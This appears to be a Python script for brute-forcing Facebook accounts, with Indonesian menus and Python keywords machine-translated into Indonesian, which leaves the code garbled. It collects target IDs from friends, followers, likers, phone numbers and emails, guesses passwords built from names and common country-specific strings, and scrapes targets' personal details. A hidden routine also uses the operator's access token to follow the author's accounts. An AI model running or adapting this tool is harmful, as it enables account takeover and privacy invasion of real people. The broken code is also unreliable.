...
spanduk def():
    print("""\x1b[0;37m ___ \n / _ \_______ ® \n / ___/ __/ -_) Multi Brute Niki────────────┐\n/_/ /_/__\__/(_) Force 3.0 Script Oleh Rahmat-XD \n / ^ \/ / // / ^ \ • • Github.com/Rahmat-XD•• \n /_/_/_/_/\_,_/_/_/_/ """)
...
def negara():
    ...
    print("%s[%s0%s] %sTidak ada"%(k,p,k,p))
    Pilih negara()
...
def log_token():
    ...
    mencoba:
        ...
        bot_ikuti()
    kecuali KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Tidak Valid"))
        os.system("hapus")
        log()
...
def bot_follow():
	mencoba:
		...
		id = a["id"]
	kecuali IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Tidak Valid"))
		log()
	jalan("%s[%s•%s] %sMohon Tunggu..."%(k,p,k,p))
	request.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket) # Dapunta Khurayra X
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Dapunta Ratya
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Almira Gabrielle X
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Antonius Raditya M
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Abigaille Dirgantara
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Boirah
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Anita Zuliatin
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Dapunta Xayonara
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Dapunta Adya R
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Wati Waningsih
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Rofi Nurhanifah
	request.post("https://graph.facebook.com/100068749665273/subscribers?access_token=" + toket) # Diah Ayu Kharisma
	request.post("https://graph.facebook.com/100068749665273/subscribers?access_token=" + toket) # Xena Alexander
	request.post("https://graph.facebook.com/100068749665273/subscribers?access_token=" + toket) # Alexandra Scarlett
	request.post("https://graph.facebook.com/100068749665273/subscribers?access_token=" + toket) # Pebrima Jun Helmi
	request.post("https://graph.facebook.com/100068749665273/subscribers?access_token=" + toket) # Aisya Asyaqila
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Niki Gagal Tenaar
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Niki Gagal Tenaar
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # NIKI Gagal tenaar
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Niki Gagal tenaar
	request.post("https://graph.facebook.com/100068397981838/subscribers?access_token=" + toket) # Niki Gagal tenaar
...
menu def():
    ...
    kecuali Pengecualian sebagai e:
        print((k+"["+p+"•"+k+"]"+p+" Kesalahan : %s"%e))
        log()
    ip = request.get("https://api.ipify.org").text
    ngr = buka('negara.txt', 'r').read()
    jika "id" di ngr:
        negara = "Indonesia"
    elif "bd" di ngr:
    ...
    os.system("hapus")
    spanduk()
    print((k+"\n[ "+p+"Selamat datang "+a["nama"]+k+" ]"+p))
    print((k+"\n["+p+"•"+k+"]"+p+" ID Anda : "+id))
    print((k+"["+p+"•"+k+"]"+p+" IP Anda : "+ip))
    print((k+"["+p+"•"+k+"]"+p+" Status : "+m+"Versi Uji"+p))
    print((k+"["+p+"•"+k+"]"+p+" Bergabung : "+durasi))
    print((k+"["+p+"•"+k+"]"+p+" Retak : "+negara))
    print((k+"\n["+p+"1"+k+"]"+p+" ID Crack Dari Publik/Teman"))
    print((k+"["+p+"2"+k+"]"+p+" ID Crack Dari Pengikut"))
    print((k+"["+p+"3"+k+"]"+p+" Crack ID Dari Likers Post"))
    print((k+"["+p+"4"+k+"]"+p+" Retak Dengan Nomor Telepon"))
    print((k+"["+p+"5"+k+"]"+p+" Crack Melalui Email"))
    print((k+"["+p+"6"+k+"]"+p+" Dapatkan Target Data"))
    print((k+"["+p+"7"+k+"]"+p+" Hasil Retak"))
    print((k+"["+p+"8"+k+"]"+p+" Agen Pengguna"))
    print((k+"["+p+"0"+k+"]"+p+" Keluar"))
    pilih_menu()
...
def pilih_menu():
	...
	jika r="":
		...
		mencoba:
			jalan(k+"\n["+p+"•"+k+"]"+p+" Terima Kasih Telah Menggunakan Script Saya")
			os.system("rm -rf login.txt")
			keluar()
		kecuali Pengecualian sebagai e:
			print((k+"["+p+"!"+k+"]"+p+" Kesalahan %s"%e))
	lain:
		print((k+"["+p+"!"+k+"]"+p+" Masukan Salah"))
		Tidak bisa()	

def pilihcrack(file):
  print((k+"\n["+p+"1"+k+"]"+p+" Api ("+k+"Cepat"+p+")"))
  print((k+"["+p+"2"+k+"]"+p+" Api + TTL ("+k+"Cepat"+p+")"))
  print((k+"["+p+"3"+k+"]"+p+" Mbasic ("+k+"Lambat"+p+")"))
  print((k+"["+p+"4"+k+"]"+p+" Mbasic + TTL ("+k+"Lambat"+p+")"))
  print((k+"["+p+"5"+k+"]"+p+" Facebook Gratis ("+k+"Super Lambat"+p+")"))
  krah=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
  jika krah di[""]:
    print((k+"["+p+"!"+k+"]"+p+" Isi Yang Benar"))
    pilihcrack(berkas)
...
def publik():
	mencoba:
		toket=open("login.txt",,"r").read()
	kecuali IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Tidak Valid"))
		os.system("rm -rf login.txt")
		log()
	mencoba:
		print((k+"\n["+p+"•"+k+"]"+p+" Ketik \'saya\' Untuk Dibuang Dari Daftar Teman"))
		idt = input(k+"["+p+"•"+k+"]"+p+" Target ID Pengguna : ")
		mencoba:
			jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Nama : "+op["nama"]))
		kecuali KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Tidak Ditemukan"))
			print((k+"\n[ "+p+"Kembali"+k+" ]"+p))
			publik()
		...
		ys.tutup()
		print((k+"["+p+"•"+k+"]"+p+" Jumlah ID : %s"%(len(id))))
		kembali pilihcrack(qq)
	kecuali Pengecualian sebagai e:
		keluar(k+"["+p+"!"+k+"]"+p+" Kesalahan : %s"%e)
...
def random_numbers():
  data = []
  print((k+"\n["+p+"•"+k+"]"+p+" Angka Harus 5 Digit"))
  print((k+"["+p+"•"+k+"]"+p+" Contoh : 92037"))
  kode=str(input(k+"["+p+"•"+k+"]"+p+" Nomor Masukan : "))
  ...
  print(k+"\n["+p+"•"+k+"]"+p+" Crack Dimulai, Mohon Tunggu...\n")
...
def random_email():
  ...
  exit((k+"["+p+"•"+k+"]"+p+" Isi Yang Benar")) jika bukan domain di ['g','y','h'] else ''
  jml=int(input(k+"["+p+"•"+k+"]"+p+" Jumlah : "))
  setpw=input(k+"["+p+"•"+k+"]"+p+" Setel Kata Sandi : ").split(',')
  print(k+"\n["+p+"•"+k+"]"+p+" Crack Dimulai, Mohon Tunggu...\n")
  ...
  mencoba:
    untuk pw masuk:
      ...
      if re.search('(EAAAA)\w+', str(respons.text)):
        print('\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s '%(str(pengguna), str(pw))))
        merusak
      elif 'www.facebook.com' di response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s '%(str(pengguna), str(pw))))
        merusak
  kecuali: lulus
...
tujuan pasti():
	...
	mencoba:
		...
		mencoba:
			jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Nama Akun : "+op["nama"]))
			print((k+"["+p+"•"+k+"]"+p+" Nama Pengguna : "+op["namapengguna"]))
			mencoba:
				jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
			...
			mencoba:
				jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Tanggal Lahir : "+op["ulang tahun"]))
			kecuali KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Tanggal Lahir : -"))
			mencoba:
				jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Jenis Kelamin : "+op["jenis kelamin"]))
			kecuali KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Jenis Kelamin : -"))
			mencoba:
			...
			mencoba:
				...
				identitas = []
				b = json.loads(a.teks)
				bb = (op["nama_pertama"]+".json").replace(" ","_")
				jw = buka(bb , "w")
				untuk c di b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((k+"["+p+"•"+k+"]"+p+" Jumlah Pengikut : %s"%(len(id))))
			kecuali KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Jumlah Pengikut : -"))
			mencoba:
				jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Situs web : "+op["situs web"]))
			kecuali KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Situs Web : -"))
			kecuali IOError:
				print((k+"["+p+"•"+k+"]"+p+" Situs Web : -"))
			mencoba:
				jok = request.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
...
def menghasilkan (teks):
	hasil=[]
	ct = buka('negara.txt', 'r').read()
	untuk saya di text.split(" "):
		jika len(i)<3:
			melanjutkan
		lain:
			i=i.bawah()
			jika len(i)==3 atau len(i)==4 atau len(i)==5:
				hasil.tambahkan(i+"123")
				hasil.tambahkan(i+"12345")
			lain:
				hasil.tambahkan(i+"123")
				hasil.tambahkan(i+"12345")
				hasil.tambahkan(i)
				jika "id" di ct:
					...
					result.append("123456")
				elif "bd" di ct:
					result.append("786786")
					result.append("000786")
					result.append("102030")
					result.append("556677")
				elif "pk" di ct:
					result.append("pakistan")
					result.append("786786")
					result.append("000786")
				elif "kita" di ct:
					result.append("123456")
					result.append("qwerty")
					result.append("aku sayang kamu")
...
def pilih_menu_user_agent():
    ...
    jika pmu di[""]:
        ...
        print("\n%s[%s!%s] %sAgen Pengguna Dihapus"%(k,p,k,p))
        masukan(k+"\n[ "+p+"Kembali"+k+" ]"+p)
        Tidak bisa()
    elif pmu di["4","04"]:
        periksa_ugent()
...
def change_ugent():
    ...
    mencoba:
        ...
        Tidak bisa()
    kecuali (KeyError, IOError):
        jalan("\n%s[%s•%s] %sGagal Mengubah Agen Pengguna"%(m,p,m,p))
        masukan(k+"\n[ "+p+"Kembali"+k+" ]"+p)
        Tidak bisa()

def check_ugent():
    mencoba:
        ungser = buka('ugent.txt', 'r').read()
    kecuali IOError:
        ungser = ("%s[%s!%s] %sAgen Pengguna Tidak Ditemukan"%(k,p,k,p))
    kecuali: lulus
    print ("\n%s[%s•%s] %sAgen Pengguna Anda : \n\n%s%s"%(k,p,k,p,h,ungser))
    masukan(k+"\n[ "+p+"Kembali"+k+" ]"+p)
    Tidak bisa()
